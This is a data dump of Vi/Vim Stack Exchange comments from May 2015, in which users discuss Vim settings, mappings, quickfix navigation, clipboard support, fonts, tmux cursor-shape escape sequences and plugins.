  <row Id="4634" PostId="3318" Score="0" Text="I would claim not a bug. This setting is a comma separated list. Since there is already a trailing comma in the setting it means that an empty item is in the setting. (Whether an empty item means anything is probably dependent on the setting). When you do `+=` on a setting  that is a comma separated list it will always add a comma unless it is empty since you are trying to add something to the list. Using the existing comma would remove the empty item. Which is probably unexpected. (`:help :set+=`) (However the empty item ignoring everything could be a bug)" CreationDate="2015-05-18T17:11:55.847" UserId="46" />
  <row Id="4635" PostId="3318" Score="0" Text="@FDinoff that's a good point, there could be a setting which expects an empty item." CreationDate="2015-05-18T18:07:10.667" UserId="488" />
  <row Id="4636" PostId="3306" Score="0" Text="Default behavior: add 'foldmarker' surrounded by 'commentstring'&#xA;:he foldmarker -&gt; 	string (default: &quot;{{{,}}}&quot;)&#xA;:he commentstring -&gt; string	(default &quot;/*%s*/&quot;)&#xA;'commentstring' is used if it isn't empty." CreationDate="2015-05-19T10:29:55.223" UserId="1145" />
  <row Id="4638" PostId="3329" Score="0" Text="That seems efficient enough for me. Thanks!" CreationDate="2015-05-19T15:45:32.277" UserId="1841" />
  <row Id="4639" PostId="3327" Score="2" Text="The answers to the duplicate question basically focus on slowness related with too many syntax items. The person who asked the question was using EasyTags with tags syntax highlight enabled. I've added another answer regarding vim's slowness when using syntax folding, which might be what is affecting @Thomson." CreationDate="2015-05-19T18:52:29.550" UserId="599" />
  <row Id="4640" PostId="3334" Score="0" Text="Why exactly do you `gf` in the quickfix window? Use `&lt;CR&gt;` to open a quickfix entry. Also, use `&lt;C-w&gt;p` to put the cursor in the previous window." CreationDate="2015-05-19T22:01:04.757" UserId="54" />
  <row Id="4641" PostId="3337" Score="3" Text="Right away map `:cnext` and `:cprev` to something convenient. Personally I use `]q` and `[q` which are provided by [unimpaired.vim](https://github.com/tpope/vim-unimpaired). If you pick good mappings you will be surprised how little you need the quickfix window." CreationDate="2015-05-19T23:46:16.697" UserId="778" />
  <row Id="4642" PostId="3329" Score="0" Text="You may be interested in the following [vimcast](http://vimcasts.org/) episodes: [Pasting from Visual mode](http://vimcasts.org/episodes/pasting-from-visual-mode/) and [Swapping two regions of text with exchange.vim](http://vimcasts.org/episodes/swapping-two-regions-of-text-with-exchange-vim/)" CreationDate="2015-05-19T23:48:35.490" UserId="778" />
  <row Id="4643" PostId="3335" Score="2" Text="Could also use an expression mapping with some conditional. e.g. `map! &lt;expr&gt; \bbq get(g:, 'use_mappings', 1) ? 'ℚ' : '\bbq'`. Now you can do `:let g:use_mappings = 0` to turn off the mappings. I also feel like these mappings should be abbreviations instead of mappings." CreationDate="2015-05-19T23:52:15.623" UserId="778" />
  <row Id="4644" PostId="3335" Score="0" Text="@PeterRincker I like to be able to search for α say by typing /\alpha. That works with `map!` but not `ab`." CreationDate="2015-05-20T03:39:15.927" UserId="2160" />
  <row Id="4645" PostId="3337" Score="1" Text="Indeed, `:cn` and `:cp` become tedious very quickly, even with `@:`. I have them mapped to `&lt;End&gt;` and `&lt;Home&gt;` respectively." CreationDate="2015-05-20T07:08:41.640" UserId="54" />
  <row Id="4646" PostId="3338" Score="0" Text="Thats is a totally valid way to do it and I didn't know &lt;kbd&gt;Ctrl+R&lt;/kbd&gt;. So thats a good answer thank you." CreationDate="2015-05-20T07:41:34.640" UserId="1841" />
  <row Id="4647" PostId="1938" Score="0" Text="This method doesn't work for me: instead of maximizing the window it opens a pop-up menu allowing to restaure, move, minimize, maximize(...) the window. I'm using Windows 7 SP1 and gvim 7.4.711. How can I make it work?" CreationDate="2015-05-20T07:48:22.393" UserId="1841" />
  <row Id="4648" PostId="1938" Score="0" Text="@statox, that's what you'd see if you left off the `x` from the end. Make sure you have the _full_ text `au GUIEnter * sim ~x`." CreationDate="2015-05-20T07:52:53.243" UserId="579" />
  <row Id="4649" PostId="1938" Score="0" Text="@paxdiablo I'm not sure to understand I copied the full line (both long and short version) from `au` to `~x`. Is there a whitespace caracter I'm missing or something like that?" CreationDate="2015-05-20T07:57:14.653" UserId="1841" />
  <row Id="4650" PostId="1938" Score="0" Text="@statox, when you have a gvim window open and you mouse-click the system button (the vim icon most top-left, above the file menu), do you see a maximize? When that system menu is open, does it maximise when you press x?" CreationDate="2015-05-20T08:06:03.313" UserId="579" />
  <row Id="4651" PostId="1938" Score="0" Text="@paxdiablo, I understand the problem now: when I open this menu pressing `x` doesn't maximize the window. On mmy system it is the key `n` which does the job (probably because it is a french system). Thank you for your comment it helped me to understand what happened!" CreationDate="2015-05-20T08:16:10.357" UserId="1841" />
  <row Id="4652" PostId="1938" Score="0" Text="Good point, @statox, I'll update the answer to mention how it works and how locale can affect it." CreationDate="2015-05-20T08:42:56.027" UserId="579" />
  <row Id="4653" PostId="3340" Score="0" Text="This doesn't look like the cursorline. It's probably something in your vimrc file. See: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)." CreationDate="2015-05-20T11:15:48.710" UserId="51" />
  <row Id="4654" PostId="3340" Score="1" Text="This question [is also on Stack Overflow](http://stackoverflow.com/questions/30347416/cursorline-is-always-showing-after-the-cursor-go-over)." CreationDate="2015-05-20T11:21:44.293" UserId="51" />
  <row Id="4655" PostId="3340" Score="0" Text="I've seen something similar in the past.  I never got to the root cause of it, but I'm pretty sure it was related to a font problem, not to Vim." CreationDate="2015-05-20T11:25:18.500" UserId="1577" />
  <row Id="4656" PostId="3341" Score="1" Text="I'm fairly sure you don't need to recompile Vim to enable `+clipboard` on Debian. I don't have a Debian system available, but [when I wrote this](http://vi.stackexchange.com/a/96/51) people pointed out that installing the `vim-gtk` or `vim-gnome` package should do the trick. The only extra dependency you have for `vim-gtk` will be gtk2 (which you probably already have on most systems anyway). IMHO, the ability to upgrade easily is a lot less effort than installing a few extra dependencies." CreationDate="2015-05-20T13:56:28.490" UserId="51" />
  <row Id="4657" PostId="3341" Score="0" Text="Yes I could get it, but aptitude show vim-gnome shows _This package contains a version of vim compiled with a GNOME2 GUI and support for scripting with Lua, Perl, Python, Ruby, and Tcl._ and GTK, you need to replace GNOME with GTK. So it adds many more feature than the only one I need: +lua, +perl, and gnome/GTK things. Which on a whole would make vim much heavier." CreationDate="2015-05-20T13:57:53.240" UserId="2170" />
  <row Id="4658" PostId="3341" Score="2" Text="I did some very basic speed tests of Vim compiled with `--tiny` (almost no features) and `--huge` (all features), and didn't really notice a significant increase in memory or system usage. The tests very very basic, but unless you're noticing performance problems I wouldn't worry about it." CreationDate="2015-05-20T14:03:36.773" UserId="51" />
  <row Id="4659" PostId="3313" Score="0" Text="That's why you keep your vimrc on github or bitbucket and pull it down to the new machine." CreationDate="2015-05-20T14:09:35.997" UserId="1862" />
  <row Id="4660" PostId="3343" Score="0" Text="It looks like that did it! Thank you for your help." CreationDate="2015-05-20T14:50:00.763" UserId="1862" />
  <row Id="4661" PostId="3341" Score="0" Text="Just install vim-gnome or vim-gtk, you won't notice a difference. Except for the presence of clipboard support, that is. Clipboard support depends on  GUI anyway so you don't really have a choice, here. Also, did you try xclip?" CreationDate="2015-05-20T16:09:50.093" UserId="54" />
  <row Id="4663" PostId="3342" Score="4" Text="Why not just disable screensavers/timeout-to-lock on those machines? It'd be a much cleaner solution than to configure vim to work around Caffeine's strange behavior. Or at least make Caffeine simulate something like `&lt;Ctrl&gt;` instead of `&lt;F15&gt;`." CreationDate="2015-05-20T16:48:44.143" UserId="1081" />
  <row Id="4665" PostId="3343" Score="0" Text="It should be noted that presumably dead keys like `&lt;f15&gt;` are often used when  [Mapping fast keycodes in terminal Vim](http://vim.wikia.com/wiki/Mapping_fast_keycodes_in_terminal_Vim). Example of a plugin that does such a thing is [rsi.vim](https://github.com/tpope/vim-rsi)." CreationDate="2015-05-20T17:54:48.243" UserId="778" />
  <row Id="4667" PostId="3342" Score="1" Text="@Ruslan The point of using `&lt;F15&gt;` is that it very rarely means anything and is generally ignored; `&lt;Ctrl&gt;`, however, _is_ meaningful, and when triggered at the wrong time could cause unintended behavior." CreationDate="2015-05-20T18:19:06.510" UserId="1060" />
  <row Id="4669" PostId="3341" Score="0" Text="On the [page](http://vim.wikia.com/wiki/Accessing_the_system_clipboard) I have read about xclip and xsel. But I wanted to see if I had an alternative to 1) install options I am not interested in or 2) install a third party program. Reading both of your comments, it looks like I'm out of luck." CreationDate="2015-05-20T19:59:13.493" UserId="2170" />
  <row Id="4670" PostId="3336" Score="0" Text="The idea is write, the note, in Vim and only read it in Vim, so i prefer a syntax solution. I was hoping someone wrote something like what i need, i really dont know how to write that jaja" CreationDate="2015-05-20T20:47:32.690" UserId="2145" />
  <row Id="4671" PostId="3346" Score="0" Text="@bilbo_pingoin Yeah, sorry i should be more specific. i edit my question. The thing is how  can i highlight with colors some arbitrary part of my text?" CreationDate="2015-05-20T20:50:50.210" UserId="2145" />
  <row Id="4672" PostId="3336" Score="0" Text="For me, the _txtfmt_ plugin then looks perfect for this. It uses (invisible) markdown for the colors, but this has to be stored _somewhere_, and languages like HTML do it in a similar way." CreationDate="2015-05-20T20:54:52.203" UserId="970" />
  <row Id="4673" PostId="3346" Score="1" Text="Then you are probably back to @Ingo Karkat's suggestion: get you own syntax file. You can google around to see if someone already made one, but it is not that complicated to write a simple one. Once you're done, you can place it somewhere on the web (github?) to pass it from one place to another." CreationDate="2015-05-20T20:59:27.433" UserId="2170" />
  <row Id="4674" PostId="3336" Score="0" Text="But i cant read the same file in two different places with the same configuration. for example, in my home computer i wrote something like a nice red text but in my office computer i read 'µ' were should be the 'invisible red'. So i supose that txtfmt use some non-portable special characters" CreationDate="2015-05-20T21:07:54.230" UserId="2145" />
  <row Id="4675" PostId="3342" Score="0" Text="@Ruslan the OS is configured by the IT department to lock after a period of inactivity; running Caffeine allows me to bypass that, as long as I manually lock my machines when stepping away from my desk. Further, I don't have the source code for Caffeine, so I can't alter it." CreationDate="2015-05-20T21:40:27.773" UserId="1862" />
  <row Id="4676" PostId="3340" Score="0" Text="@lcd047 Thanks for your hint. I change my font size from 18 to 19, and it works. I agree that it's a font problem." CreationDate="2015-05-21T02:25:16.853" UserId="2168" />
  <row Id="4677" PostId="3342" Score="0" Text="Why doesn't it just simulate that event you get when you tap the touchpad when tapping isn't enabled, but it still focuses the window you're over - but over the current window so it doesn't do anything?" CreationDate="2015-05-21T04:01:55.260" UserId="880" />
  <row Id="4678" PostId="3336" Score="0" Text="Yes, the `µ` seems to be the markup character for red. Are you sure you have the txtfmt plugin installed on each computer?" CreationDate="2015-05-21T06:43:20.470" UserId="970" />
  <row Id="4681" PostId="3348" Score="0" Text="@niekas, then add `\s*` between `/^` and `[^`." CreationDate="2015-05-21T08:19:24.783" UserId="54" />
  <row Id="4682" PostId="3348" Score="0" Text="So the final query is: ``/^\s*import ipdb``. Thats exactly what I wanted." CreationDate="2015-05-21T08:22:48.080" UserId="147" />
  <row Id="4684" PostId="3352" Score="1" Text="Oh, the curse of today's gigantic flatscreens! As someone who started with a 40x24 character homecomputer screen, I can only shake my head in disbelief :-)" CreationDate="2015-05-21T15:54:59.410" UserId="970" />
  <row Id="4685" PostId="3342" Score="0" Text="@Random832 that's a good question; I didn't write the program, so I don't know the logic behind choosing `&lt;F15&gt;` other than what's posted on the site." CreationDate="2015-05-21T16:11:37.723" UserId="1862" />
  <row Id="4686" PostId="3352" Score="0" Text="My first home computer had a much bigger screen (640x480 if I recall correctly). But I still miss those awesome VT220 at the university! Still can't go over the image of the pile they created when throwing them out during my last years :'(" CreationDate="2015-05-21T17:21:31.173" UserId="599" />
  <row Id="4687" PostId="3354" Score="0" Text="Give me a day or two to test this around. Still need to adapt that to vim-airline ;) In the meanwhile, I've updated my question to specify the message I'm looking for. Could you confirm this solution still applies?" CreationDate="2015-05-21T17:23:19.510" UserId="599" />
  <row Id="4688" PostId="3354" Score="0" Text="@Vitor I'm not sure which &quot;X new lines&quot; message you mean, but almost all messages from Vim should end up in the message history. You can check this by typing `:messages` and see if it's there :-)" CreationDate="2015-05-21T17:46:45.927" UserId="51" />
  <row Id="4689" PostId="3354" Score="0" Text="the message is &quot;X more lines&quot;, my bad! :P But I confirm that they end up in `:messages`. Thanks!" CreationDate="2015-05-21T19:06:12.143" UserId="599" />
  <row Id="4690" PostId="3353" Score="0" Text="Static is probably not enough. It would make sense to shift the message to the column where the current window starts, but only if the message fits in the remainder of the line. But I wouldn't know even where to start looking in vim's code!" CreationDate="2015-05-21T19:16:45.330" UserId="599" />
  <row Id="4691" PostId="3354" Score="0" Text="Marked as the right answer, since there is no native support for this in Vim. Thanks once again." CreationDate="2015-05-21T19:17:22.937" UserId="599" />
  <row Id="4692" PostId="3357" Score="6" Text="The ftplugin for your language probably has mapping starting with `[` and `]` which may explain that sluggishness: if you have something mapped to `]]` (&quot;next method&quot; in python files), for example, Vim will wait a bit in order to see if you want `]` or `]]`." CreationDate="2015-05-21T19:54:49.437" UserId="54" />
  <row Id="4693" PostId="3357" Score="1" Text="Indeed, you're [right](https://github.com/vim-ruby/vim-ruby/blob/vim7.4/ftplugin/ruby.vim#L149-165). First, if you post an answer, I'll accept it. Also, can you explain by any chance why everything is fine if `filetype plugin on` is executed after `vim` has started?" CreationDate="2015-05-21T20:03:38.033" UserId="1553" />
  <row Id="4694" PostId="3352" Score="0" Text="I had a similar situation last week. I ended up using tmux to split the screen and two separate Vim's running, one in each pane. Unfortunately, while you gain status and command locality with this, you lose things like sharing registers or being able to edit the same buffer in both views, for example." CreationDate="2015-05-22T02:09:55.703" UserId="227" />
  <row Id="4695" PostId="3353" Score="0" Text="Message display occurs in src/message.c. Look at msg_attr_keep(), which calls msg_strtrunc() (makes the message fit on screen) and msg_outtrans_attr(), which eventually calls msg_puts_attr_len(), which either uses msg_puts_printf() or msg_puts_display(). This last function does fancy stuff with scrolling messages and all that. A cursory glance suggests it might be painful to modify it to display one-liner messages elsewhere, but if you are inclined, that's where I'd start. There is a variable called curwin of type win_T, which has member w_wincol which looks like the screen offset for it." CreationDate="2015-05-22T02:30:20.667" UserId="227" />
  <row Id="4698" PostId="3359" Score="2" Text="Try the plugin's readme/documentation/wiki/issue tracker instead of a generic site." CreationDate="2015-05-22T07:55:09.593" UserId="54" />
  <row Id="4699" PostId="3359" Score="0" Text="@romainl Why we can't use this site for questions about vim plugins? I think this site should be a hub for all questions regarding vi and vim-stuff." CreationDate="2015-05-22T08:33:30.890" UserId="500" />
  <row Id="4700" PostId="3359" Score="0" Text="Well, your question is not about vi, Vim or any of their clones and your chances of finding a useful answer are way higher at the places above than here. Also, the plugin's author has an issue tracker set up just for you, use it." CreationDate="2015-05-22T08:38:18.810" UserId="54" />
  <row Id="4701" PostId="3359" Score="0" Text="@romainl this is not my question. Actually I gave answer on this question below. But anyway this stie will be a lot more useful if questions about plugins and vim-stuff will be accepted here." CreationDate="2015-05-22T08:42:16.537" UserId="500" />
  <row Id="4702" PostId="3362" Score="5" Text="Can you give more information about this: _&quot;I'm using a script to load files in vim remotely into one gvim instance per desktop viewport&quot;_" CreationDate="2015-05-22T12:13:10.447" UserId="500" />
  <row Id="4705" PostId="3364" Score="3" Text="Turning on the `'hidden'` option (`set hidden`) allows you to navigate away from unsaved buffers. For me, this was a huge productivity booster, and was vital to stop relying on splits and tabs so much." CreationDate="2015-05-22T13:15:48.133" UserId="64" />
  <row Id="4706" PostId="3368" Score="0" Text="For insert mode I use `inoremap &lt;C-k&gt; &lt;C-o&gt;gk` and `inoremap &lt;C-j&gt; &lt;C-o&gt;gj` btw." CreationDate="2015-05-22T14:29:42.560" UserId="51" />
  <row Id="4707" PostId="3368" Score="0" Text="thanks jecxjo and carpetsmoker, I do not remeber the meaning of command &quot;g&quot;, but It work!" CreationDate="2015-05-22T14:34:59.927" UserId="983" />
  <row Id="4708" PostId="3368" Score="2" Text="`g` is a prefix to _a lot_ of default mappings.  In this case, `gj` and `gk` move up and down one _visual_ line, not an actual line.  For more on all mappings beginning with `g`, see `:help g`." CreationDate="2015-05-22T14:51:22.097" UserId="865" />
  <row Id="4709" PostId="3363" Score="0" Text="Hello, Alexander. I followed his instructions, but still can not get the expected result: at first installed the fonts from the site of the powerline. Then I made the settings in the .vimrc file. My .vimrc file has been shared in https://gist.github.com/geisonsn/641f13543b8b41fe2c12. I'm using Vundle manager plugin." CreationDate="2015-05-22T15:58:44.700" UserId="2179" />
  <row Id="4710" PostId="3370" Score="0" Text="It would be best to provide some sample text (and resulting text). Since you mention unix sort maybe provide an example of the sort command that would do the job." CreationDate="2015-05-22T16:54:22.810" UserId="778" />
  <row Id="4711" PostId="3363" Score="0" Text="Did you install that font in your editor? If you use vim in terminal you should install that font in the terminal, or if you use gui-version of vim (MacVim, GVim) you need to set font in the `.vimrc`-file, for example: `set guifont=DejaVu\ Sans:s12`. More information you can find here `:help guifont`." CreationDate="2015-05-22T17:05:53.787" UserId="500" />
  <row Id="4712" PostId="3371" Score="1" Text="Since the last column happens to be a hex number using the `x` flag might also be helpful." CreationDate="2015-05-22T19:22:58.340" UserId="895" />
  <row Id="4713" PostId="3363" Score="0" Text="Alexander, thank you for your help. I configured the fonts in gnome-terminou and it work. Would you can add this suggestion in your answer?" CreationDate="2015-05-22T20:00:34.380" UserId="2179" />
  <row Id="4715" PostId="3363" Score="0" Text="You are welcome! Answer is updated." CreationDate="2015-05-22T20:18:57.963" UserId="500" />
  <row Id="4716" PostId="3363" Score="0" Text="@AlexanderMyshov you have repeated configuration lines, where only the second in every two is required." CreationDate="2015-05-23T02:06:25.603" UserId="599" />
  <row Id="4717" PostId="3371" Score="0" Text="This looks great. The last column may be a special case. Any simple representation for the middle columns?" CreationDate="2015-05-23T03:15:00.157" UserId="477" />
  <row Id="4718" PostId="3371" Score="0" Text="I thought you were able to come up with something for that, but here you are. Please accept my (edited) answer by clicking on the outlined checkmark next to it. Thanks!" CreationDate="2015-05-23T09:56:28.927" UserId="970" />
  <row Id="4719" PostId="3379" Score="0" Text="Vim compiled with '+cursorshape' feature?" CreationDate="2015-05-24T01:29:51.060" UserId="1145" />
  <row Id="4721" PostId="3385" Score="0" Text="By 'inline' I was just referring to having the normal messages written to the existing buffer without any modifications (like screen redraws, or empty spaces that pushes additional messages to the bottom of the screen). In any case, your solution works, thank you!" CreationDate="2015-05-24T17:23:27.050" UserId="2207" />
  <row Id="4723" PostId="3386" Score="0" Text="It isn't possible to move windows across tabs." CreationDate="2015-05-25T05:26:20.360" UserId="1577" />
  <row Id="4724" PostId="3386" Score="0" Text="Hmm, that's too bad.  I could probably create some mapping or command which could accomplish it though." CreationDate="2015-05-25T12:08:20.230" UserId="865" />
  <row Id="4725" PostId="3388" Score="4" Text="Just a small note: in a VimScript file (i.e. `*.vim`), you never need the leading `:` characters." CreationDate="2015-05-25T14:22:24.190" UserId="64" />
  <row Id="4726" PostId="3379" Score="0" Text="Check terminal  settings. And this question looks similar &#xA; http://superuser.com/questions/634326/how-can-i-get-a-block-cursor-in-vim-in-the-cygwin-terminal" CreationDate="2015-05-25T14:24:41.227" UserId="1145" />
  <row Id="4727" PostId="3386" Score="0" Text="I think the best you can do is to save all of the window settings and then recreate it on the existing tab." CreationDate="2015-05-25T14:24:48.580" UserId="64" />
  <row Id="4728" PostId="3359" Score="0" Text="Use https://everythingfonts.com/otf-to-ttf to convert the fonts to ttf, Example: Older XShell Versions doesn't support otf." CreationDate="2015-05-25T14:57:03.910" UserId="1262" />
  <row Id="4729" PostId="3392" Score="2" Text="The use of text objects like `iw` is interesting but your solution is actually the same as @CarpetSmoker's one: visually selecting the second word and put the first one. I also think that your solution would work with a simple `p` instead of using `&quot;0` register." CreationDate="2015-05-25T16:05:31.663" UserId="1841" />
  <row Id="4730" PostId="2835" Score="0" Text="I encounter this issue as well. Have you filed it with the Github project? (https://github.com/macvim-dev/macvim/issues)" CreationDate="2015-05-25T19:24:33.617" UserId="2223" />
  <row Id="4731" PostId="3379" Score="0" Text="Which terminal emulator are you using? Have you tried something like `let &amp;t_SI = &quot;\&lt;Esc&gt;Ptmux;\&lt;Esc&gt;\&lt;Esc&gt;]50;CursorShape=1;BlinkingCursorEnabled=1\x7\&lt;Esc&gt;\\&quot;` and `let &amp;t_EI = &quot;\&lt;Esc&gt;Ptmux;\&lt;Esc&gt;\&lt;Esc&gt;]50;CursorShape=0;BlinkingCursorEnabled=0\x7\&lt;Esc&gt;\\&quot;`?" CreationDate="2015-05-25T20:11:34.053" UserId="1306" />
  <row Id="4735" PostId="3379" Score="0" Text="@jjaderberg iTerm's escape sequence? Works only in iTerm with some cautions:  &#xA;[iTerm Doc](https://iterm2.com/documentation-escape-codes.html)  &#xA;&gt;iTerm2 supports several non-standard escape codes. These may not work properly in tmux or screen, and may have unknown effects on other terminal emulators. Proceed with caution." CreationDate="2015-05-26T05:47:34.410" UserId="1145" />
  <row Id="4736" PostId="3379" Score="0" Text="@alex-kroll I was not aware that it was iTerm specific. My point was that the control sequence may need to be altered when using tmux, and that how to alter it may depend on the terminal emulator (and &quot;here's an example ...&quot;) What part of that sequence is peculiar to iTerm, btw? I thought I saw precisely or very similar sequences used for other terms, though I may be mistaken." CreationDate="2015-05-26T06:56:51.097" UserId="1306" />
  <row Id="4737" PostId="3379" Score="0" Text="@jjaderberg btw `let &amp;t_SI = &quot;\e[5 q&quot;&#xA;let &amp;t_EI = &quot;\e[2 q&quot;` `let &amp;t_EI = &quot;\e[2 q&quot;` works fine for me.&#xA;Windows7x64, vim 7.4, mintty + tmux." CreationDate="2015-05-26T08:43:58.283" UserId="1145" />
  <row Id="4739" PostId="3379" Score="0" Text="@AlexKroll The solution to the other question doesn't work for me (because of TMUX). Mintty setting: &quot;rightclick on bar &gt; Options &gt; Looks &gt; Cursor&quot; is not a solution either, because it changes the cursor permanently (vim modes still don't change the cursor)." CreationDate="2015-05-26T09:24:52.110" UserId="1067" />
  <row Id="4740" PostId="3379" Score="0" Text="@jjaderberg It doesn't work, even without tmux (also tried replacing &quot;\&lt;Esc&gt;&quot; with &quot;\e&quot;). The next three &quot;lets&quot; work only outside of tmux." CreationDate="2015-05-26T09:25:02.607" UserId="1067" />
  <row Id="4741" PostId="3379" Score="0" Text="I updated the question with additional information." CreationDate="2015-05-26T09:25:22.490" UserId="1067" />
  <row Id="4742" PostId="3395" Score="3" Text="Please give more background; what is your final goal? When a question is only about a small technical step, it's difficult to provide a good answer. If you don't tell us **why** you want this, it's easy to succumb to the [XY problem](http://meta.stackoverflow.com/questions/66377/what-is-the-xy-problem)." CreationDate="2015-05-26T10:39:37.457" UserId="970" />
  <row Id="4743" PostId="3295" Score="0" Text="I've returned back to the buffergator, because bufsurf jumps to closed buffers." CreationDate="2015-05-26T11:13:14.147" UserId="500" />
  <row Id="4744" PostId="3394" Score="0" Text="I figured that this was the case.  I could probably make a small script which does exactly that." CreationDate="2015-05-26T12:17:44.740" UserId="865" />
  <row Id="4746" PostId="3398" Score="0" Text="A better test: `if globpath(&amp;runtimepath, 'colors/solarized.vim', 1) !=# ''`." CreationDate="2015-05-26T17:15:26.703" UserId="1577" />
  <row Id="4747" PostId="3398" Score="0" Text="hmm that is a cool way to do it too.. not sure why its a better test though.. If you could elaborate on why that might be a better way to check for the file that would be awesome! (figure its just the fact that `&amp;runtimepath` will dynamically use the appropriate path no matter what your vim install is..) Either way the you just want to check that the file is present before attempting to load the colorscheme.." CreationDate="2015-05-26T17:21:27.027" UserId="2189" />
  <row Id="4749" PostId="3398" Score="1" Text="It's better (1) because of `runtimepath`, (2) because `empty()` is a list function, not a string one (even though `empty(string)` works), and (3) because your `glob()` pays attention to `suffixes` and `wildignore`." CreationDate="2015-05-26T17:47:04.367" UserId="1577" />
  <row Id="4750" PostId="3340" Score="0" Text="@lutaoact maybe you could answer your own question so as it doesn't stay unanswered :)" CreationDate="2015-05-26T18:19:22.603" UserId="1841" />
  <row Id="4751" PostId="3379" Score="1" Text="I've check my soft one more time and all versions are same with yours but $TERM in mintty options is `xterm-256color` inside tmux `screen-256color`. tmux has version 1.9 (and your is 1.9a). I've launch vim inside tmux `vim -u NULL` (-u NULL means no config). Cursor shape is block in any mode, but when I assign `t_SI` and `t_EI` shape switch from block (normal mode) to `I` (insert mode) as expected. Can you try to launch vim with empty .vimrc, without any colorschemes and plugins?" CreationDate="2015-05-26T21:49:36.667" UserId="1145" />
  <row Id="4752" PostId="3404" Score="0" Text="Thanks for the comment and, if you don't mind me asking; do you type &quot;[&quot; then &quot;hello&quot; then &quot;]&quot;. Without the surround plugins (which does seem like a great idea, thanks) it seems sort of cumbersome to go back and forth even without the problem of potentially losing the right number of brackets" CreationDate="2015-05-27T00:44:59.757" UserId="217" />
  <row Id="4753" PostId="390" Score="0" Text="What does **If you like to get crazy** mean ? Does pathogen#helptags()  eat resources ?" CreationDate="2015-05-27T04:13:49.930" UserId="1262" />
  <row Id="4754" PostId="390" Score="2" Text="@JaDogg Oh, that's from the [README](https://github.com/tpope/vim-pathogen/): &quot;Normally, Vim expects you to run :helptags on each directory with documentation (e.g., :helptags ~/.vim/doc). Provided with pathogen.vim is a :Helptags command that does this on every directory in your 'runtimepath'. If you really want to get crazy, you could even invoke Helptags in your vimrc. I don't like to get crazy.&quot; I'd say if you have a lot of plugins, this might slow down startup a bit. And you really don't need to run it at every startup, once for each plugin installation/upgrade should be enough." CreationDate="2015-05-27T04:35:52.663" UserId="205" />
  <row Id="4755" PostId="3404" Score="0" Text="Well actually I always use either auto-pairs or surround.vim (see the answer of Peter) but if I had to do that without plug-ins, I would do `[`,  `] `,  `&lt;Esc&gt;` (which will place the cursor on the `] `)  and finally `i` which will place the cursor between the brackets in insert mode." CreationDate="2015-05-27T05:24:06.527" UserId="1841" />
  <row Id="4756" PostId="3383" Score="0" Text="I see your use cases more as consequences of the behavior of this register, but I think your answer clearly describe this register with ` The black hole register is here to let us cut stuff without clobbering the unnamed register and the numbered registers.` I was expecting other answers but it seems that it's the only use of this register. Thank you a lot for your answer!" CreationDate="2015-05-27T05:40:09.913" UserId="1841" />
  <row Id="4757" PostId="3379" Score="0" Text="@AlexCroll - i renamed my ```.bashrc```, ```.tmux.conf``` and left only two variabls in ```.vimrc``` = it works now! i will be restoring my configuration and will let you know what caused the problems." CreationDate="2015-05-27T09:38:04.843" UserId="1067" />
  <row Id="4758" PostId="3379" Score="0" Text="@AlexCroll - The problem was caused by this line in my ```.bashrc```: ```export TERM=screen-256color```. If i comment the line out or change its value to for example &quot;xterm-256color&quot;, cursor changing in different vim modes in tmux works again! Maybe tmux thought it is running inside screen? You can add this as an answer so i can mark it as solution." CreationDate="2015-05-27T09:57:11.403" UserId="1067" />
  <row Id="4759" PostId="3408" Score="0" Text="I'm developing my own LaTeX-plugin (see link in the question). I've found latex-suite is way to complex and intrusive in general. The IMAP-functionality is not that bad, although I prefer to instead use something like UltiSnips for complex snippets." CreationDate="2015-05-27T10:59:42.763" UserId="21" />
  <row Id="4760" PostId="3408" Score="1" Text="`IMAP()` was interesting to define mappings, but mappings are harder to maintain than snippets/templates." CreationDate="2015-05-27T11:14:20.087" UserId="626" />
  <row Id="4761" PostId="3404" Score="0" Text="@statox when in insert mode, how do you move your cursor two positions to the left? With `ctrl-o 2h`? Is this faster than moving your hand to the cursors? ;)" CreationDate="2015-05-27T14:26:11.363" UserId="599" />
  <row Id="4762" PostId="3413" Score="0" Text="Is the syntax the same in sed?" CreationDate="2015-05-27T14:27:02.323" UserId="1065" />
  <row Id="4763" PostId="3413" Score="2" Text="@leeand00 No. All that `:g` does is run an ex command on the lines that match a pattern. So typing `:g/match/.,+1d` would be exactly the same as going to all lines with `match`, and typing `:.,+1d`" CreationDate="2015-05-27T14:29:17.060" UserId="51" />
  <row Id="4764" PostId="3404" Score="0" Text="@Vitor Nope I'll hit the Esc key to go to normal mode, for a movement of less than 3 characters i'll probably hit several time `h` or `j` and otherwise I'll use other movements. It feels faster to me, but I understand that some people feel it in a different way :)" CreationDate="2015-05-27T15:10:15.140" UserId="1841" />
  <row Id="4765" PostId="3404" Score="0" Text="@statox after 10 years using vim, I'm still struggling to use hjkl and specially in this scenario I just described. Thanks for your comments! :)" CreationDate="2015-05-27T16:17:40.500" UserId="599" />
  <row Id="4766" PostId="3258" Score="0" Text="You guys were totally right. Mapping to escape is a bad idea. I ended up changing the command to `nnoremap &lt;silent&gt; &lt;Leader&gt;\` :let @/=&quot;&quot;&lt;CR&gt;`. This clears the search register - it does **not** set the search register to an empty string as that would match everywhere.  Doing this sets up the search register in the same state as when vim starts (I like that). I got the idea from [here](http://stackoverflow.com/questions/657447/vim-clear-last-search-highlighting). I'm sorry I didn't see it there first. I did look around before I posted (posting takes up my time, too). Thanks very much, all." CreationDate="2015-05-27T16:41:30.673" UserId="2062" />
  <row Id="4767" PostId="3404" Score="0" Text="@Vitor maybe we should have this discussion in the chat rather than in the comments but I'm you've been using vim for much longer than me so I'm curious to know have the opinion of an experimented user: I agree that using `h` or `l` in this case doesn't feel particularly natural, so does it mean that in this scenario you use the arrow keys, or you found another solution?" CreationDate="2015-05-27T16:55:11.183" UserId="1841" />
  <row Id="4768" PostId="3406" Score="0" Text="It would probably be better to use buffer-local abbreviations on just tex filetypes instead of a global abbreviation that checking `'filetype'`." CreationDate="2015-05-27T17:27:55.573" UserId="778" />
  <row Id="4769" PostId="3419" Score="3" Text="[This seems to be a common problem](https://youtu.be/DIzAaY2Jm-s?t=194)" CreationDate="2015-05-27T18:06:00.687" UserId="51" />
  <row Id="4770" PostId="3406" Score="0" Text="@Peter Rincker: Yes, it's just a proof of concept.  It can be optimised in many ways, f.i. by finding the numeric IDs for `texMathZoneE` and `texMathZoneX` beforehand." CreationDate="2015-05-27T18:16:36.523" UserId="1577" />
  <row Id="4771" PostId="3419" Score="0" Text="@Carpetsmoker that's a good one" CreationDate="2015-05-27T19:37:48.857" UserId="69" />
